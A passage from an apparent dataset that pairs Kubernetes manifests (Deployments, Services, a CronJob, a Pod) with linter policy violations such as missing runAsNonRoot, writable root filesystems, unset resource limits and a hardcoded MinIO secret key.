initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "10217",
    "manifest_path": "data/manifests/the_stack_sample/sample_3940.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210608-953d79c16d\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prow-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "10218",
    "manifest_path": "data/manifests/the_stack_sample/sample_3940.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210608-953d79c16d\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-controller-manager\" not found"
  },
  {
    "id": "10219",
    "manifest_path": "data/manifests/the_stack_sample/sample_3940.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210608-953d79c16d\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "10220",
    "manifest_path": "data/manifests/the_stack_sample/sample_3940.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210608-953d79c16d\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prow-controller-manager\" has cpu request 0"
  },
  {
    "id": "10221",
    "manifest_path": "data/manifests/the_stack_sample/sample_3940.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210608-953d79c16d\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prow-controller-manager\" has memory limit 0"
  },
  {
    "id": "10222",
    "manifest_path": "data/manifests/the_stack_sample/sample_3942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: prod\n  labels:\n    app: frontend\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.1.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        env:\n        - name: PODINFO_BACKEND_URL\n          value: http://backend:9898/echo\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "10223",
    "manifest_path": "data/manifests/the_stack_sample/sample_3942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: prod\n  labels:\n    app: frontend\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.1.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        env:\n        - name: PODINFO_BACKEND_URL\n          value: http://backend:9898/echo\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "10224",
    "manifest_path": "data/manifests/the_stack_sample/sample_3943.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: front-deployment\n  labels:\n    app: front\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: front\n  template:\n    metadata:\n      labels:\n        app: front\n    spec:\n      containers:\n      - name: front\n        image: front\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"front\" is using an invalid container image, \"front\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10225",
    "manifest_path": "data/manifests/the_stack_sample/sample_3943.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: front-deployment\n  labels:\n    app: front\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: front\n  template:\n    metadata:\n      labels:\n        app: front\n    spec:\n      containers:\n      - name: front\n        image: front\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"front\" does not have a read-only root file system"
  },
  {
    "id": "10226",
    "manifest_path": "data/manifests/the_stack_sample/sample_3943.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: front-deployment\n  labels:\n    app: front\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: front\n  template:\n    metadata:\n      labels:\n        app: front\n    spec:\n      containers:\n      - name: front\n        image: front\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"front\" is not set to runAsNonRoot"
  },
  {
    "id": "10227",
    "manifest_path": "data/manifests/the_stack_sample/sample_3943.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: front-deployment\n  labels:\n    app: front\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: front\n  template:\n    metadata:\n      labels:\n        app: front\n    spec:\n      containers:\n      - name: front\n        image: front\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"front\" has cpu request 0"
  },
  {
    "id": "10228",
    "manifest_path": "data/manifests/the_stack_sample/sample_3943.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: front-deployment\n  labels:\n    app: front\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: front\n  template:\n    metadata:\n      labels:\n        app: front\n    spec:\n      containers:\n      - name: front\n        image: front\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"front\" has memory limit 0"
  },
  {
    "id": "10229",
    "manifest_path": "data/manifests/the_stack_sample/sample_3946.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: minio-pv-claim\n      containers:\n      - name: minio\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        image: minio/minio:RELEASE.2020-04-28T23-56-56Z\n        args:\n        - server\n        - /data\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        ports:\n        - containerPort: 9000\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"minio\" found"
  },
  {
    "id": "10230",
    "manifest_path": "data/manifests/the_stack_sample/sample_3946.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: minio-pv-claim\n      containers:\n      - name: minio\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        image: minio/minio:RELEASE.2020-04-28T23-56-56Z\n        args:\n        - server\n        - /data\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        ports:\n        - containerPort: 9000\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "10231",
    "manifest_path": "data/manifests/the_stack_sample/sample_3946.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: minio-pv-claim\n      containers:\n      - name: minio\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        image: minio/minio:RELEASE.2020-04-28T23-56-56Z\n        args:\n        - server\n        - /data\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        ports:\n        - containerPort: 9000\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "10232",
    "manifest_path": "data/manifests/the_stack_sample/sample_3946.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: minio-pv-claim\n      containers:\n      - name: minio\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        image: minio/minio:RELEASE.2020-04-28T23-56-56Z\n        args:\n        - server\n        - /data\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        ports:\n        - containerPort: 9000\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "10233",
    "manifest_path": "data/manifests/the_stack_sample/sample_3946.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: minio-pv-claim\n      containers:\n      - name: minio\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        image: minio/minio:RELEASE.2020-04-28T23-56-56Z\n        args:\n        - server\n        - /data\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        ports:\n        - containerPort: 9000\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "10234",
    "manifest_path": "data/manifests/the_stack_sample/sample_3947.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2816\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10235",
    "manifest_path": "data/manifests/the_stack_sample/sample_3947.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2816\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10236",
    "manifest_path": "data/manifests/the_stack_sample/sample_3947.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2816\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10237",
    "manifest_path": "data/manifests/the_stack_sample/sample_3947.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2816\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10238",
    "manifest_path": "data/manifests/the_stack_sample/sample_3947.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2816\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10239",
    "manifest_path": "data/manifests/the_stack_sample/sample_3948.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: lol-stats-server-v1\n  labels:\n    api: v1\n    app: lol-stats-server\n    env: staging\nspec:\n  selector:\n    api: v1\n    app: lol-stats-server\n    env: staging\n  ports:\n  - port: 443\n    protocol: TCP\n    targetPort: 443\n    nodePort: 32014\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[api:v1 app:lol-stats-server env:staging])"
  },
  {
    "id": "10240",
    "manifest_path": "data/manifests/the_stack_sample/sample_3949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    service: mongodb\n  name: mongodb\nspec:\n  ports:\n  - name: mongo\n    port: 27017\n    targetPort: 27017\n  selector:\n    service: mongodb\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:mongodb])"
  },
  {
    "id": "10241",
    "manifest_path": "data/manifests/the_stack_sample/sample_3950.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210812-912fbb99b5\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "10242",
    "manifest_path": "data/manifests/the_stack_sample/sample_3950.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210812-912fbb99b5\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "10243",
    "manifest_path": "data/manifests/the_stack_sample/sample_3950.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210812-912fbb99b5\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "10244",
    "manifest_path": "data/manifests/the_stack_sample/sample_3950.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210812-912fbb99b5\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "10245",
    "manifest_path": "data/manifests/the_stack_sample/sample_3951.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: bb5f39e236b36b3228ab10714f06b20b0d7e5993278b21642c236d2fea80e769\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: ghcr.io/jenkins-x/lighthouse-keeper:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: ioachim.lihor\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: enable\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-keeper\" does not have a read-only root file system"
  },
  {
    "id": "10246",
    "manifest_path": "data/manifests/the_stack_sample/sample_3951.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: bb5f39e236b36b3228ab10714f06b20b0d7e5993278b21642c236d2fea80e769\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: ghcr.io/jenkins-x/lighthouse-keeper:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: ioachim.lihor\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: enable\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-keeper\" not found"
  },
  {
    "id": "10247",
    "manifest_path": "data/manifests/the_stack_sample/sample_3951.yaml",
